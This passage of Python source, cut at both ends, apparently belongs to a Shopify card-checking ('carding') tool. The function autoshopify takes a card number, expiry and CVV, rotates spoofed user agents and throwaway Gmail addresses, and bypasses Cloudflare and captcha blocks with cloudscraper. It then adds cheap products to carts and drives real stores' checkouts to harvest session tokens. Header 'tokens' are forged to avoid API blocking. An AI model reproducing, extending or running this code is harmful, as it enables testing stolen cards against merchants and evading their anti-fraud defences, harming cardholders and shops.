    "Mozilla/5.0 (Linux; Android 11; OnePlus Nord) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6167.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Realme RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6099.225 Mobile Safari/537.36",

    # --- Windows Desktop ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.120 Safari/537.36",

    # Google Pixel 8
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",

    # Samsung Galaxy S24
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.93 Mobile Safari/537.36",

    # OnePlus 12
    "Mozilla/5.0 (Linux; Android 14; CPH2573) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.99 Mobile Safari/537.36",

    # Xiaomi 14
    "Mozilla/5.0 (Linux; Android 14; 23127PN0CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6378.88 Mobile Safari/537.36",

    # Vivo X100
    "Mozilla/5.0 (Linux; Android 14; V2309A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.119 Mobile Safari/537.36",

    # Realme GT 5 Pro
    "Mozilla/5.0 (Linux; Android 14; RMX3888) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.91 Mobile Safari/537.36",

    # Motorola Edge 50 Pro
    "Mozilla/5.0 (Linux; Android 14; XT2401-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.71 Mobile Safari/537.36",

    # Asus ROG Phone 8
    "Mozilla/5.0 (Linux; Android 14; ASUS_AI2401_D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.112 Mobile Safari/537.36",

]

def get_random_user_agent():
    return random.choice(USER_AGENTS)


def generate_security_token(url: str, card: str, timestamp: float = None) -> str:
    """
    Generate a security token to wrap requests and prevent direct API blocking.
    Creates a unique token based on URL, card, and timestamp for request authentication.
    """
    if timestamp is None:
        timestamp = time.time()
    
    # Create a unique token based on URL domain, timestamp, and a random component
    domain = urlparse(url).netloc if urlparse(url).netloc else url.split("//")[-1].split("/")[0]
    token_data = f"{domain}|{timestamp}|{random.randint(100000, 999999)}|{card[:6]}"
    token_hash = hashlib.sha256(token_data.encode()).hexdigest()[:32]
    
    # Format as UUID-like token for legitimacy
    token = f"{token_hash[:8]}-{token_hash[8:12]}-{token_hash[12:16]}-{token_hash[16:20]}-{token_hash[20:32]}"
    return token


def wrap_request_with_token(headers: dict, url: str, card: str, json_data: dict = None) -> tuple:
    """
    Wrap request with security token to prevent direct API blocking.
    Adds security tokens to headers only (doesn't modify JSON structure for API compatibility).
    Returns (updated_headers, original_json_data).
    """
    token = generate_security_token(url, card)
    timestamp = int(time.time() * 1000)
    request_id = str(uuid.uuid4())
    
    # Add security token to headers (not in JSON to maintain API compatibility)
    headers['X-Request-Token'] = token
    headers['X-Request-Timestamp'] = str(timestamp)
    headers['X-Request-Id'] = request_id
    headers['X-Client-Version'] = '1.0.0'
    headers['X-Security-Check'] = '1'
    
    # Return headers and original JSON data (unchanged for API compatibility)
    return headers, json_data

# Determine sec-ch-ua-platform based on device string
def platform(ua):
    if "Android" in ua:
        return "Android"
    elif "iPhone" in ua or "iPad" in ua:
        return "iOS"
    elif "Macintosh" in ua:
        return "macOS"
    elif "Windows" in ua:
        return "Windows"
    elif "CrOS" in ua:
        return "Chrome OS"
    else:
        return "Unknown"

async def autoshopify(url, card, session, proxy=None):

    output = {
        "Response": "UNKNOWN ERROR",
        "Status": False,
        "cc": card,
    }
    start = time.time()
    getua = get_random_user_agent()
    clienthint = platform(getua)
    gmail = __import__('random').choice(['shaikhfurkan45107@gmail.com', 'shaikhfurkan70145@gmail.com', 'huhagenma@gmail.com', 'huhagenam@gmail.com', 'fukkiharamkhor@gmail.com', 'teamsamrat5@gmail.com', 'macbhula@gmail.com', 'bhulamac@gmail.com'])
    mobile = '?1' if any(x in getua for x in ["Android", "iPhone", "iPad", "Mobile"]) else '?0'

    logger.info(f"🔄 Starting checkout for: {url}")
    logger.info(f"🎯 User-Agent: {getua[:50]}...")
    logger.info(f"📱 Platform: {clienthint}, Mobile: {mobile}")
    
    try:
        parsed = urlparse(url)
        if parsed:
            domain = parsed.netloc
        else:
            domain = url.split("//")[1]
        
        
        cc,mes,ano,cvv = map(str.strip,card.split("|"))

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        else:
            url = urlparse(url)
            url = f"https://{domain}"

        headers = {
            "User-Agent": f'{getua}',
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        # Low-product API first: https://shopify-api-new-production.up.railway.app/<site>
        # API returns variant, requires_shipping, checkout.direct_url, checkout.cart_add_url
        low_product_flow = False
        non_shipping_flow = False  # True when API says requires_shipping=False -> use cart_add_url + POST checkout + GET Location only
        product_id, price = None, None
        request = None
        site_key = None  # set in standard flow; non_shipping_flow skips fallback/GraphQL
        checkout_url = None
        checkout_text = ""
        checkout_sc = 0
        try:
            low_product = await _fetch_low_product_api(domain, session, proxy)
            if low_product and low_product.get("variantid") is not None:
                product_id = low_product["variantid"]
                price = low_product.get("price")
                if price is None:
                    price = 0.0
                low_product_flow = True
                requires_shipping = low_product.get("requires_shipping", True)
                if requires_shipping is False:
                    non_shipping_flow = True
                    logger.info(f"✅ Low-product API (non-shipping) for {url}: variant={product_id}, price={price}")
                else:
                    logger.info(f"✅ Low-product API (shipping) for {url}: variant={product_id}, price={price}")
        except Exception as e:
            logger.debug(f"Low-product API failed: {e}")

        if not low_product_flow:
            # Bulletproof: try cloudscraper first for products to avoid triggering captcha on session
            product_id, price = None, None
            request = None
            if HAS_CLOUDSCRAPER:
                try:
                    product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                    if product_id and price is not None:
                        logger.info(f"✅ Products via cloudscraper-first for {url}")
                except Exception:
                    product_id, price = None, None

            # Fetch products via session only when cloudscraper didn't succeed
            products_fetch_retries = 5
            last_error = None
            if not product_id:
                for attempt in range(products_fetch_retries):
                    try:
                        request = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=25)
                        if not request:
                            last_error = "No response object"
                            if attempt < products_fetch_retries - 1:
                                await asyncio.sleep(0.8 + attempt * 0.5)
                                continue
                            output.update({
                                "Response": "SITE_CONNECTION_ERROR",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

                        sc = getattr(request, "status_code", 0)
                        if sc == 0:
                            last_error = (getattr(request, "text", "") or "").strip() or "Status code 0 (connection failed)"
                            if attempt < products_fetch_retries - 1:
                                await asyncio.sleep(0.8 + attempt * 0.5)
                                continue
                            output.update({
                                "Response": f"SITE_CONNECTION_ERROR: {last_error[:80]}",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

                        if sc == 200:
                            break
                        if sc == 429 or (500 <= sc <= 599):
                            if attempt < products_fetch_retries - 1:
                                backoff = 2.0 + attempt * 1.0 if sc == 429 else 0.8 + attempt * 0.6
                                await asyncio.sleep(backoff)
                                continue
                        output.update({
                            "Response": f"SITE_HTTP_{sc}",
                            "Status": False,
                        })
                        _log_output_to_terminal(output)
                        return output
                    except Exception as e:
                        last_error = str(e)
                        if attempt < products_fetch_retries - 1:
                            await asyncio.sleep(0.8 + attempt * 0.5)
                            continue
                        output.update({
                            "Response": f"SITE_CONNECTION_ERROR: {last_error[:50]}",
                            "Status": False,
                        })
                        _log_output_to_terminal(output)
                        return output

                if not request or not hasattr(request, 'text'):
                    output.update({
                        "Response": f"SITE_CONNECTION_ERROR: {(last_error or 'unknown')[:80]}",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output

                # Parse products
                product_id, price = None, None
                req_text = (request.text or "").strip() if hasattr(request, 'text') else ""
                if not req_text:
                    output.update({"Response": "SITE_EMPTY_RESPONSE", "Status": False})
                    _log_output_to_terminal(output)
                    return output

                if req_text.startswith("<") or req_text.startswith("<!") or "captcha" in req_text.lower() or "challenge" in req_text.lower():
                    if HAS_CLOUDSCRAPER:
                        try:
                            product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                            logger.info(f"✅ Products via cloudscraper bypass for {url}")
                        except Exception:
                            pass
                    if not product_id:
                        output.update({"Response": "SITE_CAPTCHA_BLOCK", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                else:
                    try:
                        product_id, price = get_product_id(request)
                    except ValueError as e:
                        error_msg = str(e)
                        if error_msg == "SITE_CAPTCHA_BLOCK" and HAS_CLOUDSCRAPER:
                            try:
                                product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                                logger.info(f"✅ Products via cloudscraper bypass for {url}")
                            except Exception:
                                pass
                        if not product_id:
                            output.update({"Response": error_msg, "Status": False})
                            _log_output_to_terminal(output)
                            return output

                if not product_id:
                    output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        if not product_id:
            output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
            _log_output_to_terminal(output)
            return output

        logger.info(f"✅ Product found: ID={product_id}, Price={price}")

        # Non-shipping flow (API says requires_shipping=False): SilverBullet-style cart/add.js -> POST checkout -> tokens
        # stickerdad.com uses Cloudflare -> try cloudscraper FIRST
        if non_shipping_flow and low_product:
            logger.info("📦 Using non-shipping flow (API requires_shipping=False)")
            try:
                checkout_url = f"{url.rstrip('/')}/checkout"
                # 1) Cloudscraper full flow FIRST (collagesoup, stickerdad - Cloudflare bypass)
                # Must get full page (stableId, queueToken) - session fallback often returns "Loading" shell
                if HAS_CLOUDSCRAPER:
                    for _cs_attempt in range(3):
                        try:
                            if _cs_attempt > 0:
                                await asyncio.sleep(2.0 + _cs_attempt)
                            cs_sc, cs_text, cs_url = await asyncio.to_thread(
                                _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy
                            )
                            if cs_sc == 200 and cs_text and len(cs_text) > 1500:
                                _has_full = "stableId" in cs_text and "queueToken" in cs_text
                                _has_any = (
                                    "serialized-sessionToken" in cs_text or "serialized-session-token" in cs_text
                                    or "queueToken" in cs_text or "sessionToken" in cs_text
                                    or "serialized-sourceToken" in cs_text
                                )
                                if _has_full or (_has_any and 'class="Loading"' not in (cs_text[:8000] or "")):
                                    checkout_text = cs_text
                                    checkout_sc = 200
                                    if cs_url:
                                        checkout_url = cs_url
                                    logger.info(f"✅ Non-shipping checkout via cloudscraper (len=%s)", len(checkout_text))
                                    break
                        except Exception as e:
                            logger.debug(f"Non-shipping cloudscraper attempt {_cs_attempt + 1}: {e}")
                        if checkout_text and ("stableId" in checkout_text or "queueToken" in checkout_text):
                            break
                        await asyncio.sleep(1.0)
                # 2) Session fallback (only when cloudscraper did not get checkout page)
                if not checkout_text:
                    add_ok = False
                    add_js_headers_ns = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                        "Pragma": "no-cache",
                        "Accept": "*/*",
                        "Content-Type": "application/json",
                        "Origin": url.rstrip("/"),
                        "Referer": url.rstrip("/") + "/",
                    }
                    add_js_resp_ns = await session.post(
                        f"{url.rstrip('/')}/cart/add.js",
                        headers=add_js_headers_ns,
                        json={"items": [{"id": product_id, "quantity": 1}]},
                        timeout=18,
                    )
                    if add_js_resp_ns and getattr(add_js_resp_ns, "status_code", 0) == 200:
                        add_ok = True
                        logger.info(f"✅ Non-shipping cart/add.js for {url}")
                    if not add_ok:
                        cart_add_url_api = (low_product.get("cart_add_url") or "").strip()
                        if cart_add_url_api and cart_add_url_api.startswith("http"):
                            add_resp = await session.get(cart_add_url_api, headers={"User-Agent": getua, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}, follow_redirects=True, timeout=15)
                            if add_resp and getattr(add_resp, "status_code", 0) in (200, 302):
                                add_ok = True
                                logger.info(f"✅ Cart add via API cart_add_url for {url}")
                    if not add_ok:
                        add_resp = await session.post(
                            f"{url.rstrip('/')}/cart/add",
                            headers={"User-Agent": getua, "Content-Type": "application/x-www-form-urlencoded", "Origin": url.rstrip("/"), "Referer": url.rstrip("/") + "/", "Accept": "*/*"},
                            data={"id": product_id, "quantity": 1},
                            timeout=15,
                            follow_redirects=True,
                        )
                        if add_resp and getattr(add_resp, "status_code", 0) in (200, 302):
                            logger.info(f"✅ Cart add via POST cart/add for {url}")
                    await asyncio.sleep(0.6)
                    # POST /checkout with browser-like headers and form data; follow redirects to get real checkout URL
                    base_url = url.rstrip("/")
                    checkout_post_headers = {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "en-US,en;q=0.9",
                        "priority": "u=0, i",
                        "referer": f"{base_url}/cart",
                        "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": getua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                    }
                    checkout_post_data = {"updates[]": "1", "note": "", "checkout": ""}
                    ch_post = await session.post(
                        f"{base_url}/checkout",
                        headers=checkout_post_headers,
                        data=checkout_post_data,
                        timeout=22,
                        follow_redirects=True,
                    )
                    post_sc = getattr(ch_post, "status_code", 0)
                    # Final URL after all redirects (same-origin or Shopify checkout host)
                    checkout_url = (getattr(ch_post, "url", None) or "").strip() or f"{base_url}/checkout"
                    if isinstance(checkout_url, str) and not checkout_url.startswith("http"):
                        checkout_url = urljoin(base_url + "/", checkout_url)
                    _text = (getattr(ch_post, "text", None) or "").strip()
                    get_sc_after_redirect = post_sc
                    get_len_after_redirect = len(_text)
                    get_params = {"skip_shop_pay": "true"} if (checkout_url and "skip_shop_pay" not in checkout_url) else None
                    # Use POST response body as checkout page when 200
                    if post_sc == 200 and _text:
                        looks_like_checkout = (
                            len(_text) > 500
                            or "sessionToken" in _text
                            or "session_token" in _text
                            or "serialized-sessionToken" in _text
                            or ("checkout" in _text.lower() and ("<" in _text or "<!" in _text))
                        )
                        if looks_like_checkout or len(_text) > 200:
                            checkout_text = _text
                            request = ch_post
                            checkout_sc = 200
                            logger.info(f"✅ Non-shipping checkout page (POST follow_redirects) for {url} (len=%s)", len(checkout_text))
                            logger.info(f"✅ Auto-redirected final URL: {checkout_url[:80]}...")
                    if not checkout_text and post_sc == 200 and _text:
                        checkout_text = _text
                        request = ch_post
                        checkout_sc = 200
                        logger.info(f"✅ Non-shipping checkout page (any 200) for {url} (len=%s)", len(checkout_text))
                    # If POST returned redirect but we didn't get body, GET the final URL
                    if not checkout_text and checkout_url and post_sc in (301, 302, 303, 307, 308):
                        get_final = await session.get(
                            checkout_url,
                            headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "User-Agent": getua},
                            params=get_params,
                            follow_redirects=True,
                            timeout=22,
                        )
                        _sc = getattr(get_final, "status_code", 0)
                        _text = (getattr(get_final, "text", None) or "").strip()
                        get_sc_after_redirect = _sc
                        get_len_after_redirect = len(_text)
                        if _sc == 200 and _text and (len(_text) > 500 or "sessionToken" in _text or "checkout" in _text.lower()):
                            checkout_text = _text
                            request = get_final
                            checkout_sc = 200
                            logger.info(f"✅ Non-shipping checkout page (GET after redirect) for {url} (len=%s)", len(checkout_text))
                        if not checkout_text and _sc == 200 and len(_text) > 50:
                            checkout_text = _text
                            request = get_final
                            checkout_sc = 200
                            logger.info(f"✅ Non-shipping checkout page (any 200) for {url} (len=%s)", len(checkout_text))
                    if not checkout_text:
                        # Fallback: POST may have returned 200 or GET failed; try GET store /checkout (cart already added)
                        fallback_checkout_url = f"{url.rstrip('/')}/checkout"
                        get_params_fb = {"skip_shop_pay": "true"}
                        try:
                            get_fb = await session.get(
                                fallback_checkout_url,
                                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "User-Agent": getua},
                                params=get_params_fb,
                                follow_redirects=True,
                                timeout=22,
                            )
                            fb_sc = getattr(get_fb, "status_code", 0)
                            fb_text = (getattr(get_fb, "text", None) or "").strip()
                            if fb_sc == 200 and (len(fb_text) > 200 or "sessionToken" in fb_text or "checkout" in fb_text.lower()):
                                checkout_text = fb_text
                                request = get_fb
                                checkout_sc = 200
                                checkout_url = fallback_checkout_url
                                get_params = get_params_fb
                                logger.info(f"✅ Non-shipping checkout via GET /checkout fallback for {url} (len=%s)", len(checkout_text))
                        except Exception as e:
                            logger.debug(f"Non-shipping GET /checkout fallback failed: {e}")
                    if not checkout_text and checkout_url and HAS_CLOUDSCRAPER:
                        try:
                            cs_sc, cs_text = await asyncio.to_thread(_fetch_checkout_cloudscraper_sync, checkout_url, proxy)
                            if cs_sc == 200 and cs_text and len(cs_text) > 1500:
                                checkout_text = cs_text
                                logger.info(f"✅ Non-shipping checkout via cloudscraper (no page) for {url} (len=%s)", len(checkout_text))
                        except Exception as e:
                            logger.debug(f"Cloudscraper for checkout_url (no page) failed: {e}")
                    if not checkout_text:
                        # Include diagnostic: GET after redirect status and body length
                        diag = f"post_sc={post_sc}"
                        if post_sc in (301, 302, 303, 307, 308):
                            loc = (getattr(ch_post, "headers", None) or {}).get("location") or (getattr(ch_post, "headers", None) or {}).get("Location") or ""
                            diag += f" loc={bool(loc)}"
                        if get_sc_after_redirect is not None:
                            diag += f" get_sc={get_sc_after_redirect} get_len={get_len_after_redirect}"
                        output.update({"Response": f"CHECKOUT_NON_SHIPPING_NO_PAGE ({diag})", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    # If checkout page has no tokens (e.g. stickerdad.com loading/captcha), try cloudscraper once
                    if checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-sourceToken" not in checkout_text and HAS_CLOUDSCRAPER and checkout_url:
                        try:
                            cs_sc, cs_text = await asyncio.to_thread(_fetch_checkout_cloudscraper_sync, checkout_url, proxy)
                            if cs_sc == 200 and cs_text and len(cs_text) > 2000 and ("serialized-sessionToken" in cs_text or "serialized-sourceToken" in cs_text):
                                checkout_text = cs_text
                                logger.info(f"✅ Non-shipping checkout page via cloudscraper for {url} (len=%s)", len(checkout_text))
                        except Exception as e:
                            logger.debug(f"Non-shipping cloudscraper fallback failed: {e}")
                    # Define for rest of function (trace, retries, token extraction)
                    checkout_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "User-Agent": getua}
                    get_params = {"skip_shop_pay": "true"} if (checkout_url and "skip_shop_pay" not in checkout_url) else None
            except Exception as e:
                logger.debug(f"Non-shipping flow error: {e}")
                output.update({"Response": f"NON_SHIPPING_ERROR: {str(e)[:40]}", "Status": False})
                _log_output_to_terminal(output)
                return output

        # Low-product flow (shipping): try cloudscraper FIRST (stickerdad/tiefossi use Cloudflare)
        elif low_product_flow:
            logger.info("🛒 Using low-product flow (cloudscraper-first for checkout)")
            checkout_url = f"{url.rstrip('/')}/checkout"
            try:
                # 1) Cloudscraper full flow FIRST - bypasses Cloudflare (stickerdad.com)
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_text, cs_url = await asyncio.to_thread(
                            _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy
                        )
                        if cs_sc == 200 and cs_text and len(cs_text) > 1500:
                            _has_any = (
                                "serialized-sessionToken" in cs_text or "serialized-session-token" in cs_text
                                or "serializedSessionToken" in cs_text or "queueToken" in cs_text
                                or "sessionToken" in cs_text or "session_token" in cs_text
                            )
                            if _has_any or ("checkout" in cs_text.lower() and len(cs_text) > 3000):
                                checkout_text = cs_text
                                checkout_sc = 200
                                if cs_url:
                                    checkout_url = cs_url
                                logger.info(f"✅ Low-product checkout via cloudscraper (len=%s)", len(checkout_text))
                    except Exception as e:
                        logger.debug(f"Cloudscraper full flow: {e}")
                # 2) Regular session fallback
                if not checkout_text:
                    add_js_resp = await session.post(
                        f"{url.rstrip('/')}/cart/add.js",
                        headers={
                            "User-Agent": getua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "Content-Type": "application/json",
                            "Accept": "*/*",
                            "Origin": url.rstrip("/"),
                            "Referer": url.rstrip("/") + "/",
                        },
                        json={"items": [{"id": product_id, "quantity": 1}]},
                        timeout=12,
                    )
                    if getattr(add_js_resp, "status_code", 0) != 200:
                        output.update({"Response": f"CART_ADD_HTTP_{getattr(add_js_resp, 'status_code', 0)}", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    await asyncio.sleep(0.3)
                    ch_post = await session.post(
                        f"{url.rstrip('/')}/checkout",
                        headers={
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "referer": f"{url.rstrip('/')}/cart",
                            "user-agent": getua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "content-type": "application/x-www-form-urlencoded",
                            "origin": url.rstrip("/"),
                        },
                        data={"updates[]": "1", "note": "", "checkout": ""},
                        timeout=18,
                        follow_redirects=True,
                    )
                    _text = (getattr(ch_post, "text", None) or "").strip()
                    checkout_url = (getattr(ch_post, "url", None) or "").strip() or checkout_url
                    if getattr(ch_post, "status_code", 0) == 200 and _text and len(_text) > 1500:
                        checkout_text = _text
                        checkout_sc = 200
                        logger.info(f"✅ Low-product checkout from session POST (len=%s)", len(checkout_text))
                # 3) Cloudscraper GET fallback if we have URL but no tokens in page
                if checkout_text and HAS_CLOUDSCRAPER:
                    _no_tokens = (
                        "serialized-sessionToken" not in checkout_text and "serialized-session-token" not in checkout_text
                        and "queueToken" not in checkout_text and "serializedSessionToken" not in checkout_text
                    )
                    if _no_tokens:
                        cs_sc2, cs_text2 = await asyncio.to_thread(_fetch_checkout_cloudscraper_sync, checkout_url, proxy)
                        if cs_sc2 == 200 and cs_text2 and len(cs_text2) > 2000 and ("queueToken" in cs_text2 or "serialized-sessionToken" in cs_text2):
                            checkout_text = cs_text2
                            logger.info(f"✅ Low-product checkout via cloudscraper GET retry (len=%s)", len(checkout_text))
            except Exception as e:
                logger.error(f"❌ Low-product flow error: {e}")
                output.update({"Response": f"CART_ADD_ERROR: {str(e)[:40]}", "Status": False})
                _log_output_to_terminal(output)
                return output
        else:
            # Standard flow: GET store page for access token
            logger.info("🏪 Using standard flow (Storefront API)")
            try:
                request = await session.get(url, follow_redirects=True, timeout=20)
                if not request or request.status_code == 0:
                    output.update({
                        "Response": "SITE_CONNECTION_ERROR",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output
            except Exception as e:
                output.update({
                    "Response": f"SITE_CONNECTION_ERROR: {str(e)[:50]}",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output

            if not hasattr(request, 'text') or not request.text:
                output.update({
                    "Response": "SITE_EMPTY_RESPONSE",
                    "Status": False,
                })
                _log_output_to_terminal(output)
                return output

            request_text_for_capture = (request.text or "") if request and hasattr(request, 'text') else ""
            # If store page is HTML with captcha and no token, try cloudscraper
            if (not request_text_for_capture.strip().startswith("{") and
                any(x in (request_text_for_capture or "").lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"])):
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_store = await asyncio.to_thread(_fetch_store_page_cloudscraper_sync, url, proxy)
                        if cs_sc == 200 and cs_store:
                            request_text_for_capture = cs_store
                            logger.info(f"✅ Store page via cloudscraper bypass for {url}")
                    except Exception:
                        pass

            site_key = (
                _capture_multi(
                    request_text_for_capture,
                    ('"accessToken":"', '"'),
                    ("'accessToken':'", "'"),
                    ('accessToken":"', '"'),
                    ('storefrontAccessToken":"', '"'),
                    ('StorefrontApiAccessToken":"', '"'),
                )
                or capture(request_text_for_capture, '"accessToken":"', '"')
            )
            if not site_key:
                m = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture)
                if m:
                    site_key = m.group(1)
            if not site_key:
                m = re.search(r'storefrontAccessToken["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']', request_text_for_capture, re.I)
                if m:
                    site_key = m.group(1)

            logger.info(f"🔑 Site key found: {bool(site_key)}")

            checkout_url = None
            # Fallback when Storefront API token missing (skip when non_shipping_flow; we already have checkout_text)
            if not non_shipping_flow and (not site_key or not str(site_key).strip()):
                logger.info("⚠️ No site_key, trying fallback methods...")
                # Try low-product API fallback
                try:
                    low_fallback = await _fetch_low_product_api(domain, session, proxy)
                    if low_fallback and low_fallback.get("variantid") is not None:
                        vid = low_fallback["variantid"]
                        add_js_h = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                            "Pragma": "no-cache",
                            "Accept": "*/*",
                            "Content-Type": "application/json",
                            "Origin": url.rstrip("/"),
                            "Referer": url.rstrip("/") + "/",
                        }
                        add_js_r = await session.post(
                            f"{url.rstrip('/')}/cart/add.js",
                            headers=add_js_h,
                            json={"items": [{"id": vid, "quantity": 1}]},
                            timeout=18,
                        )
                        if getattr(add_js_r, "status_code", 0) == 200:
                            await asyncio.sleep(0.5)
                            ch_post = await session.post(
                                f"{url.rstrip('/')}/checkout",
                                headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                    "Pragma": "no-cache",
                                    "Accept": "*/*",
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Origin": url.rstrip("/"),
                                    "Referer": url.rstrip("/") + "/",
                                },
                                data="",
                                timeout=18,
                                follow_redirects=False,
                            )
                            post_sc = getattr(ch_post, "status_code", 0)
                            if post_sc in (301, 302, 303, 307, 308):
                                resp_h = getattr(ch_post, "headers", None) or {}
                                loc = resp_h.get("location") or resp_h.get("Location") or ""
                                if loc:
                                    if not loc.startswith("http"):
                                        loc = urljoin(url.rstrip("/") + "/", loc)
                                    checkout_url = loc
                                else:
                                    checkout_url = url.rstrip("/") + "/checkout"
                            else:
                                checkout_url = url.rstrip("/") + "/checkout"
                            if checkout_url:
                                logger.info(f"✅ Checkout via low-product API fallback for {url}")
                except Exception as e:
                    logger.debug(f"Low-product API fallback failed: {e}")

                if not checkout_url:
                    # Form cart/add fallback
                    try:
                        prod_resp = await session.get(f'{url.rstrip("/")}/products.json', headers={'User-Agent': getua, 'Accept': 'application/json'}, follow_redirects=True, timeout=15)
                        prod_text = (getattr(prod_resp, 'text', None) or '') if prod_resp else ''
                        if getattr(prod_resp, 'status_code', 0) == 200 and prod_text.strip().startswith('{'):
                            handle = _first_product_handle_from_json_text(prod_text)
                            if handle:
                                await asyncio.sleep(0.2)
                                page_resp = await session.get(f'{url.rstrip("/")}/products/{handle}', headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8'}, follow_redirects=True, timeout=15)
                                page_text = (getattr(page_resp, 'text', None) or '') if page_resp else ''
                                if page_text:
                                    for (a, b) in [('"accessToken":"', '"'), ("'accessToken':'", "'"), ('accessToken":"', '"'), ('storefrontAccessToken":"', '"')]:
                                        try:
                                            tok = capture(page_text, a, b)
                                            if tok and str(tok).strip():
                                                site_key = tok.strip()
                                                logger.info(f"✅ Site key from product page for {url}")
                                                break
                                        except Exception:
                                            pass
                                    if not site_key:
                                        mm = re.search(r'["\']accessToken["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']', page_text)
                                        if mm:
                                            site_key = mm.group(1)
                        await asyncio.sleep(0.2)
                    except Exception as e:
                        logger.debug(f"Product page token fetch: {e}")
                    
                    if not site_key or not str(site_key).strip():
                        add_headers = {
                            'User-Agent': getua,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': url.rstrip('/'),
                            'Referer': url.rstrip('/') + '/',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'sec-ch-ua': '"Chromium";v="144", "Not(A:Brand";v="8"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': f'"{clienthint}"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
